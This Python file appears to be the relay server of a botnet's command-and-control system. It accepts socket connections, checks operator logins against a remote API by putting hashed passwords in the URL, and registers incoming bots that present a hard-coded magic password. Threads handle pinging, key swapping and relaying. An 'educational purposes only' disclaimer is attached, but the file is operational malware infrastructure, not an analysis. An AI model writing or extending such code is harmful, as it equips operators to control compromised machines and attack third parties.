#!/usr/bin/python3

from socket import (
    socket as Sock,
    SOL_SOCKET,
    SO_KEEPALIVE,
    SO_REUSEADDR,
)
from threading import Thread
from sys import exit, argv
from time import sleep
from colorama import (
    Fore, 
    init as colorama_init,
)
from hashlib import sha256
from requests import (
    get as rget,
    Response,
)
from modules.config import RelayConfig
from modules.core import Core
from modules.relay import Relay

__filename__ = "relay"
__legit__ = "I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."

config: RelayConfig = RelayConfig(True)
core: Core = Core(config=config)
relay: Relay = Relay(core=core, config=config)

def find_login(
    username: str,
    password: str,
) -> bool:
    password: str = sha256(password.encode()).hexdigest()

    url: str = f"{config.API_URL}/login?urlkey={config.URL_KEY}&username={username}&password={password}"
    core.log(f"\n\n{url}\n\n\n\n")
    res: Response = rget(url, timeout=5000)

    return res.status_code == 200

def handle_client(
    client: Sock,
    address: tuple[str, int],
) -> None:
    core.log("handleclient\n")
    while 1:
        core.send(client, config.ANSI_CLEAR, False)
        core.send(client, f'{config.COLOR_WHITE}Username > ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue

        break

    password = ''
    while 1:
        core.send(client, config.ANSI_CLEAR, False)
        core.send(client, f'{config.COLOR_WHITE}Password > {Fore.BLACK} ', False, False)

        while not password.strip():
            password = client.recv(1024).decode().strip()

        break

    if password != '\xff\xff\xff\xff\75':
        core.send(client, config.ANSI_CLEAR, False)

        if not find_login(username, password):
            core.send(client, f'{config.COLOR_RED}[{config.COLOR_WHITE}!{config.COLOR_RED}]{config.COLOR_RESET} Invalid credentials')
            sleep(1)
            client.close()
            return

        Thread(target=relay.update_title, args=(client, username)).start()

    else: config.bots_sock.update({client: address})

def main() -> None:
    port: int = None

    if config.relay_addr.RELAY_PORT != None: port = config.relay_addr.RELAY_PORT

    else:
        if len(argv) != 2:
            core.log(f'Usage: python3 {argv[0]} <relay port>')
            exit()

        port = argv[1]
        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
            core.log('Invalid relay port')
            exit()

    colorama_init(convert=True)

    s: Sock = Sock()
    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    try: s.bind(('0.0.0.0', port))

    except Exception:
        core.log('Failed to bind port')
        exit()

    s.listen()

    Thread(target=core.ping).start()
    Thread(target=core.net).start()
    Thread(target=core.gen_swap_key).start()
    Thread(target=relay.relay).start()

    while 1:
        core.log("listen...\n")
        Thread(target=handle_client, args=[*s.accept()]).start()

if __name__ == '__main__':
    print(f"\nLegit: {__legit__}\n")
    main()
